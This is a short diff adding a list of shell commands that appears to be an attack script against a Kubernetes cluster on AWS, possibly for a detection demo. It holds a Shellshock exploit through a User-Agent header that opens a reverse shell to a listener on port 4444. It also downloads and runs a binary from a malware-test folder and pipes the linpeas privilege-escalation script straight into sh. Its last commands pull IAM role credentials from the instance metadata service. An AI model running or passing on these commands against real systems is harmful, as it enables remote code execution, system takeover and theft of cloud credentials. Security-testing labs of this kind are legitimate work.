@@ -1,0 +1,8 @@
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/192.168.136.237/4444 0>&1'" http://k8s-default-cspovvic-1ec1d5ca37-8472ea82540edcd4.elb.ap-southeast-2.amazonaws.com/cgi-bin/vulnerable
+cd tmp
+curl https://raw.githubusercontent.com/CrowdStrike/detection-container/main/bin/evil/Linux_Malware_High -o hello
+chmod +x hello
+./hello
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-tryan-test-nodegroup-ng-try-NodeInstanceRole-Kg8nEMwTabUY
